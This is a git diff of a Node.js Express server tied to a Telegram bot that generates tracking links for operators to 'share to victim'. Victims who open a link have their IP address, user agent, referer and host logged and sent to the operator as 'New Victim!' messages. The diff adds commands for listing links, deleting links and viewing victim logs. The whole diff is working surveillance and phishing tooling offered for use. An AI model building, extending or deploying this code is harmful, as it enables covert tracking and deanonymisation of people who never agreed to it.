@@ -1,7 +1,7 @@
 import fs from 'fs';
 import express from 'express';
 import bodyParser from 'body-parser';
-import config from './config.json' assert { type: "json" };
+import config from './config.js';
 import TelegramBot from 'node-telegram-bot-api';
 import DB from './db/db.js';
 import cors from 'cors';
@@ -29,7 +29,7 @@ const generateNewLink = (chatId) => {
         link: response,
         chatId: chatId
     });
-    bot.sendMessage(chatId, "Success! Your link is " + response + " , share your link to victim ");
+    bot.sendMessage(chatId, "Success! Your link is " + response + " , share your link to victim \n\n ID : "+ id + "\n\nYou can see logs victim with command /logs " + id + "\n\nYou can remove your link with command /rmlink " + response);
 
 }
 
@@ -46,6 +46,51 @@ bot.on('message', (msg) => {
         bot.sendMessage(chatId, config.help_text);
     } else if (text == "/newlink") {
         generateNewLink(chatId);
+    }else if(text == "/mylink")
+    {
+        const linksdata = DB.getData("links");
+        var response = "= Your links =```";
+        linksdata.forEach((link, index) => {
+            if(link.chatId == chatId)
+            {
+                response +=  link.link + "\n";
+            }
+        });
+        response += "```";
+        console.log(linksdata);
+        bot.sendMessage(chatId, response , {parse_mode : "Markdown"});
+    }else if(text.match(/\/rmlink (.+)/))
+    {
+        const link = text.match(/\/rmlink (.+)/)[1];
+        const linksdata = DB.getData("links");
+        linksdata.forEach((data, index) => {
+            if(data.link == link && data.chatId == chatId)
+            {
+                DB.delete("links", index);
+                bot.sendMessage(chatId, "Success! Your link " + link + " has been deleted");
+            }
+        });
+    }else if(text.match(/\/logs (.+)/))
+    {
+        const id = text.match(/\/logs (.+)/)[1];
+        const linksdata = DB.getData("links");
+        linksdata.forEach((data, index) => {
+            if(data.id == id && data.chatId == chatId)
+            {
+                const logsdata = DB.getData("logs");
+                var response = "= Logs =```";
+                logsdata.forEach((log, index) => {
+                    if(log.id == id)
+                    {
+                        response +=  log.message + "\n";
+                    }
+                });
+                response += "```";
+                bot.sendMessage(chatId, response , {parse_mode : "Markdown"});
+            }else{
+                bot.sendMessage(chatId, "Error! Your link " + id + " not found");
+            }
+        });
     }
 });
 bot.on('polling_error', (error) => {
@@ -64,13 +109,16 @@ app.get("/link/:id", (req, res) => {
 
     const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const time = new Date();
-
-    var buildMessage = "New Victim!\n";
-    buildMessage += "IP: " + userIP + "\n";
-    buildMessage += "User Agent: " + userAgent + "\n";
-    buildMessage += "Referer: " + referer + "\n";
-    buildMessage += "Host: " + host + "\n";
-    buildMessage += "Date: " + date + "\n";
+    const userAgent = req.headers['user-agent'];
+    const referer = req.headers['referer'];
+    const host = req.headers['host'];
+    const date = new Date().toLocaleString();
+    var buildMessage = "#New Victim! ID : ***"+id+"*** \n```";
+    buildMessage += "? IP: " + userIP + "\n";
+    buildMessage += "? User Agent: " + userAgent + "\n";
+    buildMessage += "? Referer: " + referer + "\n";
+    buildMessage += "? Host: " + host + "\n";
+    buildMessage += "? Date: " + date + "\n```";
 
     bot.sendMessage(chatId, buildMessage);
     bot.sendChatAction(chatId, "typing");
@@ -128,9 +176,7 @@ app.post("/api/post", (req, res) => {
             action: 'information',
             data: dt,
         });
-     //   dt = dt.replaceAll(/</g, "&lt;").replace(/>/g, "&gt;");
-        dt = dt.replaceAll("<br>","\n");
-        bot.sendMessage(chatId,dt, {parse_mode : 'HTML'});
+        bot.sendMessage(chatId,dt, {parse_mode : 'markdown'});
         res.json({ success:true});
     }
 
